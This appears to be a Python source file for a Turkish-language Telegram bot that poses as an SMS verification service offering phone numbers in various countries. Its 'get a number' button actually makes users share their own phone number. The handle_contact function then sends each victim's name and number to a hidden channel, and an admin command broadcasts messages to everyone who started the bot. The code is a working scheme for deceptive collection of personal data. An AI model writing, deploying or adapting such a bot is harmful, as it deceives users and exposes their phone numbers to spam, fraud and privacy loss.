from telegram import (
    Update,
    KeyboardButton,
    ReplyKeyboardMarkup,
    Contact
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters
)
import random
from datetime import datetime
import pytz
import os

# ENV DEĞERLERİ
TOKEN = os.getenv("BOT_TOKEN")
KANAL_ID = os.getenv("KANAL_ID")
ADMIN_ID = int(os.getenv("ADMIN_ID"))   # <-- Railway .env içine ekleniyor

TIMEZONE = pytz.timezone("Europe/Istanbul")

# KULLANICILARI KAYDETME
kullanicilar = set()
kullanici_durum = {}

ulkeler = [
    ("Türkiye", "🇹🇷"), ("Almanya", "🇩🇪"), ("Fransa", "🇫🇷"),
    ("ABD", "🇺🇸"), ("İngiltere", "🇬🇧"), ("Kanada", "🇨🇦"),
    ("İtalya", "🇮🇹"), ("İspanya", "🇪🇸"), ("Hollanda", "🇳🇱"),
    ("Japonya", "🇯🇵"), ("Rusya", "🇷🇺"), ("Brezilya", "🇧🇷"),
    ("Avustralya", "🇦🇺"), ("Hindistan", "🇮🇳"), ("Çin", "🇨🇳"),
    ("Meksika", "🇲🇽"), ("İsveç", "🇸🇪"),
]

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    kullanicilar.add(user.id)  # START ATAN HERKES KAYDEDİLİR

    ad = user.username or user.first_name
    await update.message.reply_text(
        f"✨ Hoş geldin {ad}\nSMS doğrulama botu",
        reply_markup=ReplyKeyboardMarkup(
            [[KeyboardButton("💬 SMS Onayla")]],
            resize_keyboard=True
        )
    )

async def sms_onayla(update: Update, context: ContextTypes.DEFAULT_TYPE):
    secilen = random.sample(ulkeler, 15)
    butonlar = [[KeyboardButton(f"{b} {i}")] for i, b in secilen]
    butonlar.append([KeyboardButton("🔙 Geri Dön")])

    await update.message.reply_text(
        "Bir ülke seç:",
        reply_markup=ReplyKeyboardMarkup(butonlar, resize_keyboard=True)
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    uid = update.effective_user.id

    if text == "💬 SMS Onayla":
        await sms_onayla(update, context)

    elif text == "🔙 Geri Dön":
        await start(update, context)

    elif any(text == f"{b} {i}" for i, b in ulkeler):
        kullanici_durum[uid] = True
        await update.message.reply_text(
            "BUTONA BASARAK NUMARA AL:",
            reply_markup=ReplyKeyboardMarkup(
                [[KeyboardButton("📱 Numara Al", request_contact=True)]],
                resize_keyboard=True
            )
        )

async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not kullanici_durum.get(uid):
        return

    c: Contact = update.message.contact
    zaman = datetime.now(TIMEZONE).strftime("%Y-%m-%d %H:%M:%S")

    await context.bot.send_message(
        chat_id=KANAL_ID,
        text=(
            "☎️ NUMARA ALINDI\n\n"
            f"👤 {c.first_name}\n"
            f"📱 +{c.phone_number}\n"
            f"⏰ {zaman}"
        )
    )

    await update.message.reply_text("Alındı ✅")
    kullanici_durum[uid] = False

# ------------------------------
# 🔥 DUYURU KOMUTU + ADMIN KONTROL
# ------------------------------
async def duyuru(update: Update, context: ContextTypes.DEFAULT_TYPE):

    # SADECE ADMIN KULLANABİLİR
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Bu komutu sadece admin kullanabilir.")
        return

    if not context.args:
        await update.message.reply_text("Kullanım: /duyuru mesajınız")
        return

    mesaj = " ".join(context.args)
    sayi = 0

    for uid in list(kullanicilar):
        try:
            await context.bot.send_message(chat_id=uid, text=mesaj)
            sayi += 1
        except:
            pass

    await update.message.reply_text(f"📢 Duyuru gönderildi ({sayi} kişiye).")

def main():
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("duyuru", duyuru))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    app.run_polling()

if __name__ == "__main__":
    main()
